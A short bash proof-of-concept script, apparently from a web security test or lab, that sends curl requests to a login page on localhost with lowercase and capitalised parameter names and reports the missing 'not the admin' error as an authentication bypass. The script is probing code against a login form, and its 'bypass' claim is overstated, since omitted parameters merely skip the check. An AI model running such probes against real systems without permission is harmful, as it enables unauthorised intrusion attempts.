#!/bin/bash

# POC: Parameter Case Sensitivity Allows Bypassing Error Handling
# Demonstrates that authentication logic depends on specific parameter case

TARGET_URL="http://localhost:3000/index.php"

echo "=== Parameter Case Sensitivity Bypass POC ==="
echo ""
echo "Testing parameter name case sensitivity on login form..."
echo ""

# Test 1: Lowercase parameters (expected case)
echo "[TEST 1] Using lowercase parameters (username, password):"
echo "URL: $TARGET_URL?username=admin&password=test"
RESPONSE1=$(curl -s "$TARGET_URL?username=admin&password=test")
if echo "$RESPONSE1" | grep -q "not the admin"; then
    echo "✓ Result: Error message present - 'not the admin' found"
    echo "  Authentication logic WAS triggered"
else
    echo "✗ Result: No error message"
fi
echo ""

# Test 2: Uppercase first letter parameters (different case)
echo "[TEST 2] Using mixed case parameters (Username, Password):"
echo "URL: $TARGET_URL?Username=admin&Password=test"
RESPONSE2=$(curl -s "$TARGET_URL?Username=admin&Password=test")
if echo "$RESPONSE2" | grep -q "not the admin"; then
    echo "✗ Result: Error message present - 'not the admin' found"
    echo "  Authentication logic WAS triggered"
else
    echo "✓ Result: No error message - blank form returned"
    echo "  Authentication logic was NOT triggered"
fi
echo ""

# Verify the vulnerability exists
echo "[VULNERABILITY VERIFICATION]"
if ! echo "$RESPONSE1" | grep -q "not the admin"; then
    echo "✗ FAILED: Baseline test (lowercase) didn't return error message"
    exit 1
elif echo "$RESPONSE2" | grep -q "not the admin"; then
    echo "✗ FAILED: Mixed case test also triggered error message"
    exit 1
else
    echo "✓ CONFIRMED: Parameter case sensitivity vulnerability exists"
    echo "  - Lowercase parameters: Authentication logic triggered"
    echo "  - Mixed case parameters: Authentication logic bypassed"
    exit 0
fi